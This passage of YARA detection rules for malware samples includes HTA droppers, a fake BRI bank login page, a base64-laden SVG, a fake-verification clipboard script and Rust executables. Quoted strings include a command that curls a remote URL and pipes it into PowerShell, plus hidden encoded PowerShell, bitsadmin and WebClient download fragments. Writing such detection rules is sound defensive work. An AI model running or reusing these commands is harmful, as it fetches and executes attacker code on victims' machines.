      $s6 = "//theme: 'light_square', /* light_rounded / dark_rounded / light_square / dark_square */" fullword ascii /* score: '13.00'*/
      $s7 = "    $obj.get(0).appendChild(script);" fullword ascii /* score: '13.00'*/
      $s8 = "rseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;" fullword ascii /* score: '12.00'*/
      $s9 = "delay: -ss_count * 1000," fullword ascii /* score: '12.00'*/
      $s10 = " * @param event - ui tab event 'show'" fullword ascii /* score: '12.00'*/
      $s11 = " * @param ui - jquery ui tabs object" fullword ascii /* score: '12.00'*/
      $s12 = "template: \"{avatar}{join}{text}{time}\"," fullword ascii /* score: '11.00'*/
      $s13 = "var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;" fullword ascii /* score: '10.00'*/
      $s14 = "jQuery(nextSlideElement).find(\"div.description\").animate({\"opacity\": 0}, 0);" fullword ascii /* score: '10.00'*/
      $s15 = "jQuery(nextSlideElement).find(\"div.description\").animate({\"opacity\": 1}, 2000);" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x6f64 and filesize < 80KB and
      8 of them
}

rule sig_3587d3370cda15e87c9bd5d42f0de864c4c3817cb6ac68d53bbe3a2db155028f_3587d337 {
   meta:
      description = "_subset_batch - file 3587d3370cda15e87c9bd5d42f0de864c4c3817cb6ac68d53bbe3a2db155028f_3587d337.hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "3587d3370cda15e87c9bd5d42f0de864c4c3817cb6ac68d53bbe3a2db155028f"
   strings:
      $s1 = "  (function(_0x10987a,_0x53323f){var a0_0x97117a={_0x149ab5:0x246,_0x3027e8:0x267,_0x1dd53a:0x3e5,_0x4dc699:0x46f,_0x56cd7a:0x23" ascii /* score: '24.00'*/
      $s2 = "05be={};function _0x49648b(_0x544ea6,_0xe2d18f){return a0_0xec067(_0x544ea6- -0x3fa,_0xe2d18f);}try{var _0x378790=GetObject(_0x4" ascii /* score: '17.00'*/
      $s3 = "eafa5(_0x49fda1- -a0_0x1e3562._0x1d1de3,_0xa8e926);}try{var _0x31813f=_0x2a5864[_0x3ebd47(0x1ab,0x202)+'\\x72'](_0x407d95),_0x5d" ascii /* score: '12.00'*/
      $s4 = "_0x4307d0:0x322};function _0x1a3d53(_0xd43e30,_0x11bff5){return a0_0xec067(_0x11bff5- -0x2f7,_0xd43e30);}try{var _0x1d36a8=new A" ascii /* score: '12.00'*/
      $s5 = "cf){return a0_0xec067(_0x258dcf- -a0_0x208307._0x1839e0,_0x2894f9);}var _0x4f51e5=_0x4b8da1[_0x16ea16(a0_0x325c61._0xa3780,-0x70" ascii /* score: '12.00'*/
      $s6 = "bc0:0xc};function _0x4a3bff(_0x7fa059,_0x3c6a2a){return a0_0xec067(_0x3c6a2a- -0x4ec,_0x7fa059);}try{var _0x349ba5=new ActiveXOb" ascii /* score: '12.00'*/
      $s7 = "0xec067(_0x32f6bb- -a0_0x53c5c5._0x5a44d2,_0x37c851);}return![];}function a0_0x1ab0c1(_0x3790b8){var a0_0xdc47a3={_0x538950:0x26" ascii /* score: '12.00'*/
      $s8 = "38dd,_0x208a65){return a0_0xec067(_0x208a65- -0xb,_0x1f38dd);}try{var _0x1f197c=new ActiveXObject('\\x53\\x63\\x72\\x69\\x70\\x7" ascii /* score: '12.00'*/
      $s9 = "0x3e8f80){return a0_0xec067(_0x5191b0- -0x28b,_0x3e8f80);}var _0x3cc1b8='';for(var _0x4290a2=0x0;_0x4290a2<_0x1968a1;_0x4290a2++" ascii /* score: '12.00'*/
      $s10 = "7aa01){return a0_0xec067(_0x57aa01- -a0_0x31a35e._0x124313,_0x465586);}return _0x4d4cd8;}function a0_0x25ce94(_0x215a5a){var a0_" ascii /* score: '12.00'*/
      $s11 = "0x19883d);function _0x30576a(_0x5816bd,_0x21838f){return a0_0xec067(_0x5816bd- -a0_0x49cd47._0x564530,_0x21838f);}while(_0x5b228" ascii /* score: '12.00'*/
      $s12 = "ion _0x2acda4(_0x11a4ba,_0x516a9a){return a0_0xec067(_0x516a9a- -0x72a,_0x11a4ba);}var _0x218c1e=new ActiveXObject(_0x2acda4(-a0" ascii /* score: '12.00'*/
      $s13 = "x2b78bf:0x9e,_0x51220:0x38};function _0x3db063(_0x2c7e6c,_0xe0d021){return a0_0xec067(_0xe0d021- -0x401,_0x2c7e6c);}try{var _0x3" ascii /* score: '12.00'*/
      $s14 = "tion _0x240cdf(_0xce8b4f,_0x28f9a4){return _0x4195b9(_0x28f9a4,_0xce8b4f- -0x411);}return![];});function _0x4195b9(_0xfcc1a0,_0x" ascii /* score: '12.00'*/
      $s15 = "x452,_0x4cfa9b:0x43c,_0x4c2cef:0x46b,_0x1ebc06:0x523};function _0x486631(_0x1ae104,_0xed7614){return a0_0xec067(_0x1ae104- -0xa0" ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 400KB and
      8 of them
}

rule sig_7f60a5d43d694e703f2f1947573cc670329c0caaef18313337b7a8643691fb32_7f60a5d4 {
   meta:
      description = "_subset_batch - file 7f60a5d43d694e703f2f1947573cc670329c0caaef18313337b7a8643691fb32_7f60a5d4.hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "7f60a5d43d694e703f2f1947573cc670329c0caaef18313337b7a8643691fb32"
   strings:
      $x1 = ":\\x20','Write','Methods_','GET','Duration','SeSecurityPrivilege','mshta.exe','840610WkTfHM','number','Description:\\x20','Downl" ascii /* score: '86.00'*/
      $x2 = "  var a0_0x132d2b=a0_0x4da9;(function(_0x55b46d,_0x45c4e0){var _0x3b37ef=a0_0x4da9,_0x18cb1f=_0x55b46d();while(!![]){try{var _0x" ascii /* score: '70.00'*/
      $x3 = "sallowStartIfOnBatteries','cmd.exe',':00','Count','WindowStyle','ExecutionTimeLimit','SELECT\\x20*\\x20FROM\\x20Win32_ComputerSy" ascii /* score: '37.00'*/
      $x4 = "Terminate','cmd.exe\\x20/c\\x20','PROCESSOR_ARCHITEW6432','Windows\\x20XP','Status','charAt','responseBody','replace','\\x5crun." ascii /* score: '36.00'*/
      $x5 = "ck:\\x20','0123456789ABCDEF','curl.exe\\x20-k\\x20-o\\x20\\x22','\\x20>\\x20\\x22','hDefKey','MediaType','getDate','Scripting.Fi" ascii /* score: '31.00'*/
      $x6 = ":\\x20','Write','Methods_','GET','Duration','SeSecurityPrivilege','mshta.exe','840610WkTfHM','number','Description:\\x20','Downl" ascii /* score: '31.00'*/
      $s7 = "m','ProductType','Windows\\x208','trim','DeleteTask','OpenTextFile','%SystemRoot%\\x5csystem32\\x5cshell32.dll,0','Windows\\x201" ascii /* score: '30.00'*/
      $s8 = "tion,\\x20Version,\\x20ProductType\\x20FROM\\x20Win32_OperatingSystem','Path','Run','send','.com','msiexec.exe\\x20/i\\x20\\x22'" ascii /* score: '30.00'*/
      $s9 = "Object','GetFolder','[Error]\\x20Domain\\x20Admins:\\x20','Win32_Process','split','No\\x20connection\\x20to\\x20Domain\\x20Contr" ascii /* score: '29.00'*/
      $s10 = "in.exe\\x20/transfer\\x20\\x22','[Error]\\x20ADSI\\x20Computer\\x20Enumeration:\\x20','DomainRole','getTime','taskType','PartOfD" ascii /* score: '28.00'*/
      $s11 = "lose','.exe','Process','SaveToFile','DomainName','OpenDSObject','.lnk','item','DomainSid','NetBIOS\\x20Name:\\x20','SELECT\\x20*" ascii /* score: '28.00'*/
      $s12 = "0a','RegRead','powershell.exe\\x20-nop\\x20-w\\x20hidden\\x20-enc\\x20','Domain\\x20SID:\\x20','getFullYear','POST','(Domain\\x2" ascii /* score: '27.00'*/
      $s13 = "dToFile','UserName','Send','User\\x20SID:\\x20','EXTERNAL','match','GetSecurityDescriptor','_utf8_encode','ConnectServer','bitsa" ascii /* score: '24.00'*/
      $s14 = "5crun.py','Authorization','[Error]\\x20Win32_Group:\\x20','Windows\\x20Server\\x202008\\x20R2','SetRequestHeader','RelPath','toU" ascii /* score: '24.00'*/
      $s15 = "es','x86','Domain/Workgroup:\\x20','Domain\\x20Name:\\x20','\\x27,(New-Object\\x20Net.WebClient).DownloadData(\\x27','.txt','All" ascii /* score: '23.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 200KB and
      1 of ($x*) and all of them
}

rule sig_21648dca111c95d780ac927b666a8c9df1424ce5bff451f66f7d68584990a41c_21648dca {
   meta:
      description = "_subset_batch - file 21648dca111c95d780ac927b666a8c9df1424ce5bff451f66f7d68584990a41c_21648dca.html"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "21648dca111c95d780ac927b666a8c9df1424ce5bff451f66f7d68584990a41c"
   strings:
      $x1 = "                <a href=\"login.html\"><img src=\"https://blogger.googleusercontent.com/img/a/AVvXsEg35l8dP8AAJJE47Fy4NWk9x2CDxQ" ascii /* score: '33.00'*/
      $x2 = "                <a href=\"login.html\"><img src=\"https://blogger.googleusercontent.com/img/a/AVvXsEg35l8dP8AAJJE47Fy4NWk9x2CDxQ" ascii /* score: '33.00'*/
      $s3 = "<meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">" fullword ascii /* score: '15.00'*/
      $s4 = "<meta content=\"https://hosting.tigerengine.id/lvit0j.jpg\" property=\"og:image\">" fullword ascii /* score: '15.00'*/
      $s5 = "<meta property=\"og:description\" content=\"Gedung BRI Jl. Jenderal Sudirman Kav.44-46 Jakarta 10210 Indonesia\">" fullword ascii /* score: '15.00'*/
      $s6 = "    if (key === 'Backspace' && event.target.value.length === 0) {" fullword ascii /* score: '15.00'*/
      $s7 = " <link href=\"https://hosting.tigerengine.id/lvit0j.jpg\" rel=\"icon\" type=\"image/x-icon\">" fullword ascii /* score: '15.00'*/
      $s8 = "    <!-- Demo styles -->" fullword ascii /* score: '12.00'*/
      $s9 = "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0, maximum-scale=1\">" fullword ascii /* score: '11.00'*/
      $s10 = "    <link href=\"https://hosting.tigerengine.id/lvit0j.jpg\" rel=\"apple-touch-icon\">" fullword ascii /* score: '10.00'*/
      $s11 = "inp.addEventListener(\"input\", val);" fullword ascii /* score: '10.00'*/
      $s12 = "    $(\"#process\").show();" fullword ascii /* score: '10.00'*/
      $s13 = "            $(\"#process\").hide();" fullword ascii /* score: '10.00'*/
      $s14 = "};</script>" fullword ascii /* score: '10.00'*/
      $s15 = "            <button type=\"button\" onclick=\"next();\">LOGIN</button>" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x683c and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule sig_31e1923b71034f33cd5d23cefd5420f7841e79881607a9ec86a469ce524a2f24_31e1923b {
   meta:
      description = "_subset_batch - file 31e1923b71034f33cd5d23cefd5420f7841e79881607a9ec86a469ce524a2f24_31e1923b.svg"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "31e1923b71034f33cd5d23cefd5420f7841e79881607a9ec86a469ce524a2f24"
   strings:
      $x1 = "        var ietogxrmodcprveupudd = 'PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVzIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAg" ascii /* score: '51.00'*/
      $x2 = "<svg data-c2a13c2417c852a4fc04b3e1=\"34527e0ae8fb_a31024db49f149a38c0e9699f50c40cc_df5a9eaa544c641b_999da792f93e0d2591a7d313f158" ascii /* score: '45.00'*/
      $x3 = "OGgvU1I3MWlLOGVhdHpDQ3Nlb00zeUFRVmNkdkVXTURGU1VvRkNGdXQyZS96QnVvM09yNkdlL2RSd2MyZXJDUUdoaGFtUGo3QUFnZFJaa1hJWitsdkRCMDF1M25iZ0tS" ascii /* base64 encoded string '8h/SR71iK8eatzCCseoM3yAQVcdvEWMDFSUoFCFut2e/zBuo3Or6Ge/dRwc2erCQGhhamPj7AAgdRZkXIZ+lvDB01u3nbgKR' */ /* score: '34.00'*/
      $x4 = "SzlXTTg1Tkk4Z3JSekNuUEZFWW56MndIMk5paVRnbWdHdS9HdmlyenJ2QUI1Y1FTRkxKaTZMb2x2eVcxalFiTFNiQ2JlR08xbXRsUGdMcExEcEdEMGQ1Zm5DY3NvbWJv" ascii /* base64 encoded string 'K9WM85NI8grRzCnPFEYnz2wH2NiiTgmgGu/GvirzrvAB5cQSFLJi6LolvyW1jQbLSbCbeGO1mtlPgLpLDpGD0d5fnCcsombo' */ /* score: '33.00'*/
      $x5 = "RlNaZEZleDdtemptUm5JbFBEYVNFSThONGpPMEEzRjBmNUNBaG1oS3RiaHA2STRPQmtjaE5sekhtL2FKU3c1bkp1cnVsdllXaVo2Umhzek14d1RCQ0hIOStKR0F4SFVo" ascii /* base64 encoded string 'FSZdFex7mzjmRnIlPDaSEI8N4jO0A3F0f5CAhmhKtbhp6I4OBkchNlzHm/aJSw5nJurulvYWiZ6RhszMxwTBCHH9+JGAxHUh' */ /* score: '33.00'*/
      $x6 = "<!-- PADDING_FINAL_MASIVO_34527e0ae8fb: XWZNAGEATAPAWGYPDTYGGZGIDYATNGNEARPWAGZQNNGRAYANRQPXGEYEERXPDXWRRPPNXRPZXWPEXNTDGYNXDXIX" ascii /* score: '33.00'*/
      $x7 = "d1g5aXlzY0VSUDJNd2JOMGE0WjN6YkllVzlackxUSWo5ayt5UnVQSDlHNVc3OEh1dnpoRTAzdWQ4OUtQTjE5dHBpRUVLckg3cmduOFp0cDVuc2NLL3B1Ukg3VThjQjhv" ascii /* base64 encoded string 'wX9iyscERP2MwbN0a4Z3zbIeW9ZrLTIj9k+yRuPH9G5W78HuvzhE03ud89KPN19tpiEEKrH7rgn8Ztp5nscK/puRH7U8cB8o' */ /* score: '32.00'*/
      $x8 = "enJLalMzVURPbis3bWFCcnpXd2Y4VlByeXRsckhZZzNZUUdOdDJKNnVZVDlLaGRvdkNjREdTdFk1Ny9lY2R6c3dYUVZUdU5GdzhsTmpSNXVKaEVCTFordXJmSkEyT2Vp" ascii /* base64 encoded string 'zrKjS3UDOn+7maBrzWwf8VPrytlrHYg3YQGNt2J6uYT9KhdovCcDGStY57/ecdzswXQVTuNFw8lNjR5uJhEBLZ+urfJA2Oei' */ /* score: '32.00'*/
      $x9 = "OTFjZ3drK29vSUpvR3dWZHBJNzVmaUJlcnEyeFlLc3NoYURwb1VaMUx5bjdmWWtPdEpFSDlLdERQK09jUGMxSElkQU1LU2Z0eld2UkdjSUVTbm5PUDlSSTF0VTRGdUFO" ascii /* base64 encoded string '91cgwk+ooIJoGwVdpI75fiBerq2xYKsshaDpoUZ1Lyn7fYkOtJEH9KtDP+OcPc1HIdAMKSftzWvRGcIESnnOP9RI1tU4FuAN' */ /* score: '31.00'*/
      $x10 = "QU9yb05BanVZdnpaTEQ2YytVQ2d1QnJ3L0RGMWVZcW5zY3h5RlRTOGJuamluRkpUdlNDRnhGQm9WUnFTMC85Q2hWc0RUZ1F1dllDRDc2RmQ1QjIrclZmWTVuc3NxYkl4" ascii /* base64 encoded string 'AOroNAjuYvzZLD6c+UCguBrw/DF1eYqnscxyFTS8bnjinFJTvSCFxFBoVRqS0/9ChVsDTgQuvYCD76Fd5B2+rVfY5nssqbIx' */ /* score: '31.00'*/
      $x11 = "NUFPdkEyTHpwN25IVUJKeVhaRG1aOXkzL21LSVBiT2lyb0xOUThLRWptemp2THlYSHlUK2IzVFN4UG1veFI2UHd1dmxhcEFhcE9XR0pwVjh0RmxLYWVXYjFsTzdOYnQ2" ascii /* base64 encoded string '5AOvA2Lzp7nHUBJyXZDmZ9y3/mKIPbOiroLNQ8KEjmzjvLyXHyT+b3TSxPmoxR6PwuvlapAapOWGJpV8tFlKaeWb1lO7Nbt6' */ /* score: '31.00'*/
      $x12 = "a3AvL3UxY1drOWVUQ1lrNXB2NHg3WCs3dllUczM2cTNQaFhUU3VDWDJUd0pLeTZBRk1BK1BPb0VGRk54ZGlLUEVtQTVLOGdwaUFUaGZMZXJEMmJVNzkwZzBzdnVZZEdI" ascii /* base64 encoded string 'kp//u1cWk9eTCYk5pv4x7X+7vYTs36q3PhXTSuCX2TwJKy6AFMA+POoEFFNxdiKPEmA5K8gpiAThfLerD2bU790g0svuYdGH' */ /* score: '31.00'*/
      $x13 = "a0UxQWlMcktmMHI2MzF0ZFpScEZmQXdlbUpqOFQ0TG1Ea0ZzQm9SaklGcmpjWFc4K0d6UDFlNkFFTG9zdTh6RTRkNjBDOFJlOGRKV2IrcmNGMm5HejlNbVN1M1ZHS1dH" ascii /* base64 encoded string 'kE1AiLrKf0r631tdZRpFfAwemJj8T4LmDkFsBoRjIFrjcXW8+GzP1e6AELosu8zE4d60C8Re8dJWb+rcF2nGz9MmSu3VGKWG' */ /* score: '31.00'*/
      $x14 = "RUJWVFV1eXFMenZOdjR2UDNvZnRZRVpYSzg0RUhacGZTWHQxWEUxZS9XM1hYdGtvdlVHYkRDUmprYm1MRkdEWnJ5L0VxQjgxdUJ0L0hHNjIwQ1Z0aWVKNGp4TjdvWkRU" ascii /* base64 encoded string 'EBVTUuyqLzvNv4vP3oftYEZXK84EHZpfSXt1XE1e/W3XXtkovUGbDCRjkbmLFGDZry/EqB81uBt/HG620CVtieJ4jxN7oZDT' */ /* score: '31.00'*/
      $x15 = "c1EyeTdhQzFPc2FSRFMxeUdVdllZUG1sU2FCTmtJOGNidVQzVk5CeWxIM01IQjVvQ0ZhQm1KSS8xekh3VjhTUXA0MUR2NWJyV3JHSjRpWDFqYlMzWisvVFNJK2QzenBN" ascii /* base64 encoded string 'sQ2y7aC1OsaRDS1yGUvYYPmlSaBNkI8cbuT3VNBylH3MHB5oCFaBmJI/1zHwV8SQp41Dv5brWrGJ4iX1jbS3Z+/TSI+d3zpM' */ /* score: '31.00'*/
   condition:
      uint16(0) == 0x733c and filesize < 30000KB and
      1 of ($x*)
}

rule sig_071aea6f31916ed6f0f67a34e8c2cebe403962457db5edc7ae49e2743d5cdb7c_071aea6f {
   meta:
      description = "_subset_batch - file 071aea6f31916ed6f0f67a34e8c2cebe403962457db5edc7ae49e2743d5cdb7c_071aea6f.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "071aea6f31916ed6f0f67a34e8c2cebe403962457db5edc7ae49e2743d5cdb7c"
   strings:
      $s1 = "const cmd = `cmd /c curl rihby.com/aws.amazon.com/l93jb803hn3b7j4bbvkkl3jjd3bqd038fnh/onl/sec/app/ |  powershell`;" fullword ascii /* score: '27.00'*/
      $s2 = "        console.log(\"error:\", text);" fullword ascii /* score: '20.00'*/
      $s3 = "            console.log(\"success:\", event.data.text);" fullword ascii /* score: '17.00'*/
      $s4 = "            console.log(\"copied:\", text);" fullword ascii /* score: '17.00'*/
      $s5 = "    const textToCopy = commandToRun + suffix + ploy;" fullword ascii /* score: '14.00'*/
      $s6 = "const verifLogoId = document.getElementById(\"verifying\");" fullword ascii /* score: '14.00'*/
      $s7 = "const content = document.getElementById(\"HJup0\");" fullword ascii /* score: '14.00'*/
      $s8 = "ation.host);" fullword ascii /* score: '12.00'*/
      $s9 = "if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {" fullword ascii /* score: '12.00'*/
      $s10 = "function stageClipboard(commandToRun, verification_id) {" fullword ascii /* score: '11.00'*/
      $s11 = " Windows User Alert! **${uniqueUsername}** clicked! " fullword ascii /* score: '11.00'*/
      $s12 = "document.getElementById(\"waiting-for\").innerText = document.getElementById(\"waiting-for\").innerText.replaceAll(\"...\", wind" ascii /* score: '10.00'*/
      $s13 = "window.addEventListener(\"message\", function(event) {" fullword ascii /* score: '10.00'*/
      $s14 = "checkboxBtn.addEventListener(\"click\", async () => {" fullword ascii /* score: '10.00'*/
      $s15 = "const verifyWnd = document.getElementById(\"verify-window\");" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x6f63 and filesize < 20KB and
      8 of them
}

rule sig_0568db2e45dccd19a48fb1898c9bea9021c17e4a8ed00bf59a3bb87637def336_0568db2e {
   meta:
      description = "_subset_batch - file 0568db2e45dccd19a48fb1898c9bea9021c17e4a8ed00bf59a3bb87637def336_0568db2e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "0568db2e45dccd19a48fb1898c9bea9021c17e4a8ed00bf59a3bb87637def336"
   strings:
      $s1 = " http://www.microsoft.com/windows0" fullword ascii /* score: '17.00'*/
      $s2 = "Phttp://www.microsoft.com/pkiops/certs/Microsoft%20Time-Stamp%20PCA%202010(1).crt0" fullword ascii /* score: '13.00'*/
      $s3 = "Nhttp://www.microsoft.com/pkiops/crl/Microsoft%20Time-Stamp%20PCA%202010(1).crl0l" fullword ascii /* score: '13.00'*/
      $s4 = "Fhttp://www.microsoft.com/pkiops/crl/MicWinProPCA2011_2011-10-19.crl%200a" fullword ascii /* score: '13.00'*/
      $s5 = "            <requestedExecutionLevel" fullword ascii /* score: '11.00'*/
      $s6 = "    processorArchitecture=\"amd64\"" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      all of them
}

rule sig_2eabe9054cad5152567f0699947a2c5b_imphash__4c4325b3 {
   meta:
      description = "_subset_batch - file 2eabe9054cad5152567f0699947a2c5b(imphash)_4c4325b3.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "4c4325b30bdd642079ff785e3cb3b7b71f556a8880c106fe8d160da35f6a6124"
   strings:
      $s1 = "<assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" language=\"*\" processorArchitec" ascii /* score: '26.00'*/
      $s2 = " publicKeyToken=\"6595b64144ccf1df\"/>" fullword ascii /* score: '13.00'*/
      $s3 = "* JkYz" fullword ascii /* score: '9.00'*/
      $s4 = "* ||y+" fullword ascii /* score: '9.00'*/
      $s5 = "fzrqrxmy" fullword ascii /* score: '8.00'*/
      $s6 = "imbfmfzj" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      all of them
}

rule sig_2eabe9054cad5152567f0699947a2c5b_imphash__74d244f4 {
   meta:
      description = "_subset_batch - file 2eabe9054cad5152567f0699947a2c5b(imphash)_74d244f4.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "74d244f41116f22c96ee927913c6085831a65de509c29d1721effc4eb7e702fe"
   strings:
      $s1 = "<assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" language=\"*\" processorArchitec" ascii /* score: '26.00'*/
      $s2 = " publicKeyToken=\"6595b64144ccf1df\"/>" fullword ascii /* score: '13.00'*/
      $s3 = "# D% U* o, I0 " fullword ascii /* score: '9.00'*/
      $s4 = "|xz][* -" fullword ascii /* score: '9.00'*/
      $s5 = "Y A` -c " fullword ascii /* score: '9.00'*/
      $s6 = "vfytcqx" fullword ascii /* score: '8.00'*/
      $s7 = "hehnivpu" fullword ascii /* score: '8.00'*/
      $s8 = "nzul%N%" fullword ascii /* score: '8.00'*/
      $s9 = "mvzlzswh" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      all of them
}

rule sig_2ee06a0981ffb07622cf8185958c87ad_imphash_ {
   meta:
      description = "_subset_batch - file 2ee06a0981ffb07622cf8185958c87ad(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "d820c262b35cdb3788af6d808a0449f38b70ff05963eccfb84ee4cdbf2339689"
   strings:
      $x1 = "bcryptprimitives.dll" fullword ascii /* reversed goodware string 'lld.sevitimirptpyrcb' */ /* score: '33.00'*/
      $s2 = "#$*+-./:?@\\_cmd.exe /e:ON /v:OFF /d /c \"" fullword ascii /* score: '28.00'*/
      $s3 = "NotFoundPermissionDeniedConnectionRefusedConnectionResetHostUnreachableNetworkUnreachableConnectionAbortedNotConnectedAddrInUseA" ascii /* score: '27.00'*/
      $s4 = "entity not foundpermission deniedconnection refusedconnection resethost unreachablenetwork unreachableconnection abortednot conn" ascii /* score: '27.00'*/
      $s5 = "Akey123mykey123mykey123mykey123mykey123mykey123mykey123mykey123mykey123mykey123mykey123mykey123mykey123mykey123mykey123mykey123m" ascii /* score: '22.00'*/
      $s6 = "fatal runtime error: drop of the panic payload panicked, aborting" fullword ascii /* score: '21.00'*/
      $s7 = "ectedaddress in useaddress not availablenetwork downbroken pipeentity already existsoperation would blocknot a directoryis a dir" ascii /* score: '20.00'*/
      $s8 = "\\\\.\\pipe\\__rust_anonymous_pipe1__." fullword ascii /* score: '19.00'*/
      $s9 = "failed to spawn thread" fullword ascii /* score: '18.00'*/
      $s10 = "fatal runtime error: I/O error: operation failed to complete synchronously, aborting" fullword ascii /* score: '18.00'*/
      $s11 = "ddrNotAvailableNetworkDownBrokenPipeAlreadyExistsNotADirectoryIsADirectoryDirectoryNotEmptyReadOnlyFilesystemFilesystemLoopStale" ascii /* score: '17.00'*/
      $s12 = "6d796b6579313233" ascii /* score: '17.00'*/ /* hex encoded string 'mykey123' */
      $s13 = "/rustc/6b00bc3880198600130e1cf62b8f8a93494488cc\\library\\alloc\\src\\collections\\btree\\node.rsassertion failed: edge.height =" ascii /* score: '17.00'*/
      $s14 = "NetworkFileHandleInvalidInputInvalidDataTimedOutWriteZeroStorageFullNotSeekableQuotaExceededFileTooLargeResourceBusyExecutableFi" ascii /* score: '16.00'*/
      $s15 = "assertion failed: edge.height == self.node.height - 1" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      1 of ($x*) and 4 of them
}

rule sig_6d0991e35994c6a5ba11e0bd8e00f2f7_imphash_ {
   meta:
      description = "_subset_batch - file 6d0991e35994c6a5ba11e0bd8e00f2f7(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "342a0f367acd0b1e8996afc3761434941b8191b1abc67e92ac62e75e1a38f2da"
   strings:
      $x1 = "bcryptprimitives.dll" fullword ascii /* reversed goodware string 'lld.sevitimirptpyrcb' */ /* score: '33.00'*/
      $s2 = "#$*+-./:?@\\_cmd.exe /e:ON /v:OFF /d /c \"" fullword ascii /* score: '28.00'*/
      $s3 = "NotFoundPermissionDeniedConnectionRefusedConnectionResetHostUnreachableNetworkUnreachableConnectionAbortedNotConnectedAddrInUseA" ascii /* score: '27.00'*/
      $s4 = "entity not foundpermission deniedconnection refusedconnection resethost unreachablenetwork unreachableconnection abortednot conn" ascii /* score: '27.00'*/
      $s5 = "fatal runtime error: drop of the panic payload panicked, aborting" fullword ascii /* score: '21.00'*/
      $s6 = "123mykey123temp.exestub.rs" fullword ascii /* score: '21.00'*/
      $s7 = "ectedaddress in useaddress not availablenetwork downbroken pipeentity already existsoperation would blocknot a directoryis a dir" ascii /* score: '20.00'*/
      $s8 = "\\cmd.exeP" fullword ascii /* score: '20.00'*/
      $s9 = "\\\\.\\pipe\\__rust_anonymous_pipe1__." fullword ascii /* score: '19.00'*/
      $s10 = "encrypted.pdb" fullword ascii /* score: '19.00'*/
      $s11 = "failed to spawn thread" fullword ascii /* score: '18.00'*/
      $s12 = "fatal runtime error: I/O error: operation failed to complete synchronously, aborting" fullword ascii /* score: '18.00'*/
      $s13 = "ddrNotAvailableNetworkDownBrokenPipeAlreadyExistsNotADirectoryIsADirectoryDirectoryNotEmptyReadOnlyFilesystemFilesystemLoopStale" ascii /* score: '17.00'*/
      $s14 = "/rustc/6b00bc3880198600130e1cf62b8f8a93494488cc\\library\\alloc\\src\\collections\\btree\\node.rsassertion failed: edge.height =" ascii /* score: '17.00'*/
      $s15 = "NetworkFileHandleInvalidInputInvalidDataTimedOutWriteZeroStorageFullNotSeekableQuotaExceededFileTooLargeResourceBusyExecutableFi" ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      1 of ($x*) and 4 of them
}

rule sig_6d0991e35994c6a5ba11e0bd8e00f2f7_imphash__f70fd797 {
   meta:
      description = "_subset_batch - file 6d0991e35994c6a5ba11e0bd8e00f2f7(imphash)_f70fd797.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "f70fd7975dce72b8bc98ce97ef4c9bf3a7f98b7d5f3c3d521f1cd7e6b388302d"
   strings:
      $x1 = "bcryptprimitives.dll" fullword ascii /* reversed goodware string 'lld.sevitimirptpyrcb' */ /* score: '33.00'*/
      $s2 = "#$*+-./:?@\\_cmd.exe /e:ON /v:OFF /d /c \"h]" fullword ascii /* score: '28.00'*/
      $s3 = "NotFoundPermissionDeniedConnectionRefusedConnectionResetHostUnreachableNetworkUnreachableConnectionAbortedNotConnectedAddrInUseA" ascii /* score: '27.00'*/
      $s4 = "entity not foundpermission deniedconnection refusedconnection resethost unreachablenetwork unreachableconnection abortednot conn" ascii /* score: '27.00'*/
      $s5 = "fatal runtime error: drop of the panic payload panicked, aborting" fullword ascii /* score: '21.00'*/
      $s6 = "ectedaddress in useaddress not availablenetwork downbroken pipeentity already existsoperation would blocknot a directoryis a dir" ascii /* score: '20.00'*/
      $s7 = "\\\\.\\pipe\\__rust_anonymous_pipe1__." fullword ascii /* score: '19.00'*/
      $s8 = "encrypted.pdb" fullword ascii /* score: '19.00'*/
      $s9 = "failed to spawn thread" fullword ascii /* score: '18.00'*/
      $s10 = "fatal runtime error: I/O error: operation failed to complete synchronously, aborting" fullword ascii /* score: '18.00'*/
      $s11 = "Mkey123mykey123mykey123mykey123mykey123mykey123mykey123mykey123mykey123mykey123mykey123mykey123mykey123mykey123mykey123mykey123m" ascii /* score: '18.00'*/
